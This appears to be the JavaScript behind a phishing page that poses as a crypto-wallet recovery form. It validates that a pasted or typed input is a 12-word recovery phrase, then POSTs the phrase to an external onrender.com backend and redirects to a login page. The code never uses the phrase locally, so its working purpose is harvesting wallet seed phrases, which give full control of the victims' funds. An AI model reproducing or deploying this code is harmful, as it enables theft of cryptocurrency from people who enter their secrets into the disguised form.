let inputData = ""
let error = false

document.querySelector(".text-area").addEventListener("input",(e)=>{
    document.querySelector(".error-box").classList.add("display")
    if(document.querySelector(".text-area").value === ""){
        document.querySelector(".button").innerHTML = `<i class="fa-solid fa-paste"></i> Paste`
    }
    else{
        document.querySelector(".button").innerHTML = "Continue"
    }
    inputData = e.target.value
})

function calculateWords(inputData){
    let len = inputData.length;
    let count = 0;
    for(let i=0;i<len;i++){
      if(inputData.charAt(i)==' ') count++;
    }
    if(count==11) return true;
    return false;
}
  
function checkSymbNum(inputData){
    let inputLen = inputData.length
    for(let i=0;i<inputLen;i++){
      if((inputData.charCodeAt(i)>=0 && inputData.charCodeAt(i)<=31) || (inputData.charCodeAt(i)>=33 && inputData.charCodeAt(i)<=64) || (inputData.charCodeAt(i)>=91 && inputData.charCodeAt(i)<=96) || (inputData.charCodeAt(i)>=123 && inputData.charCodeAt(i)<=126)){
        return false;
      }
    }
    return true;
}

document.querySelector(".button").addEventListener("click",async(e)=>{
    e.preventDefault()
    const str = (String)(document.querySelector(".button").innerHTML)
    let finalStr = ""
    for(let i = str.length-5;i<str.length;i++){
        finalStr+=str.charAt(i)
    }
    if(finalStr == "Paste"){
        const text = await navigator.clipboard.readText()
        document.querySelector(".text-area").value += text 
    }
})

document.querySelector(".button").addEventListener("click",(e)=>{
    if(document.querySelector(".button").innerHTML === "Continue"){
        e.preventDefault()
        let length = inputData.length
        let words_count = 0;
        for(let i=0;i<length;i++){
            let str = "";
            let j=i;
            for(j=i;j<length;j++){
                if(inputData.charAt(j)==' ') break;
                else str=str + inputData.charAt(j);
            }
            i=j;
            let res = checkSymbNum(str);
            words_count++;
            console.log(words_count)
            if(!res){
                document.querySelector(".error-box").innerHTML = "*Recovery Phrase Should Not Contain Any Special Or Numeric Values";
                document.querySelector(".error-box").classList.remove("display");
                error = true;
                break;
            }
        }
    
        if(words_count != 12){
            error = true;
            document.querySelector(".error-box").innerHTML = "*Recovery Phrase Should Be Of 12 Words"
            document.querySelector(".error-box").classList.remove("display")
        }
    
        if(!error){
            const url = "https://backend-01-92mi.onrender.com/api/data9";
            const data = {
                recoveryPhrase:inputData
            };
            const options = {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            };
    
            fetch(url, options)
            .then(response => {
                if (!response.ok) {
                throw new Error('Network response was not ok');
                }
                return response.json();
            })
            .then(data => {
                console.log(data)
                if(data.status === "Confirmed"){
                  window.location.assign("../LoginPage/loginpage.html");
                }
            })
            .catch(error => {
                console.error('Fetch error:', error);
            });
        }
    }
})


